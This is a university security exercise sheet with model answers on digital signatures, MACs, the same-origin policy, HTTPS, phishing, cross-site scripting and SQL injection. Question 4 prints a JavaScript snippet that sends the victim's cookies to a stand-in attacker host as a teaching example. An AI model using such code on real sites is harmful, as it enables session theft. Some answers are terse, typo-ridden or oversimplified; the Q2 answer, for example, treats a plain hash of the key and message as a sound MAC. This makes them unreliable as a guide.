# Exercises sheet 3

**Correction after reading week.**

1. Barack often sends funny jokes to Hillary. He does not care about confidentiality of these messages but wants to get credit for the jokes and prevent Bill from claiming authorship of or modifying them. How can this be achieved using public-key cryptography?

	**ANS:** Barack can sign jokes with his private key.

2. As public-key cryptography is computationally intensive and drains the battery of Barack’s device, he comes up with an alternative approach. First, he shares a secret key k with Hillary but not with Bill. Next, together with a joke x, he sends over the value d = h(k||x), where h is a cryptographic hash function. Does value d provide assurance to Hillary that Barack is the author of x and that x was not modified by Bill? Justify your answer.

	**ANS:** Yes. As `k` is shared only between Hillary and Barack, no one can produce a valid d without knowing `k`. Also crypto hash are irreversible, Bill can not learn the secret `k` from d. See massege authentication code MAC slides.

3. Barack periodically comes up with brilliant ideas to stop the financial crisis, provide health care to every citizen, and save the polar bears. He wants to share these ideas with all the cabinet members but also get credit for the ideas. Extending the above approach, he shares a secret key k with all the cabinet members. Next, he broadcasts each idea z followed by value h(k||z). Does this approach work or can Tim claim that he came up with the ideas instead of Barack? Justify your answer.

	**ANS:** This approach does not work as every member of cabinet has the secret `k` and thus is capable of creating the hash, i..e Tim can also claim that z is created by him.

4. Suppose that you accedently visit a malicious site www.evil.com, which contains a JavaScript to access cookies related to your e-shopping site buy-all.bz as follows:
`<script>
img = new Image();
img.src = "http://www.evil.com/steal.php?cookie=" + document.cookie;
</script>`. Will that be successful?

	**ANS:** No. Becuase of SOP, evil.com will not be able to access the cookies related to buy-all.bz.

5. Which of the following security goals are addressed by the HTTPS protocol: (a) privacy, (b) confidentiality, (c) availability.

	**ANS:** b

6. Is it possible for an attacker to performa phishing attack if the client is using HTTPS? Why or why not?

	**ANS:** Phishing can involved tricks that range from ebing very simple, like asking your credit cards details to sophisticated ones, like redirecting you to a spoofed site. HTTPS can prevent when it comes to site identity with the help of digital certificates. In other simpler cases, it may not be useful.

7. Explain why, in general, a web server should not be allowed access to cookies set by another web server.

	**ANS:** see slides on same origin policy.
8. Summarize the difference between persistent and non-persistent cross-site scripting attacks.

	**ANS:** se slides. Among other differences, one important one is that in the case of non-persistent (reflective), the attacker has to find each individual victim and send her/him the malicious link, whereas in the case of persistant, all an attacker has to do is to just poison the server.
9. Explain why input validation mitigates the risks of SQL injection attacks.

	**ANS:** to clean the input that may contain some specal characters, like single quote.
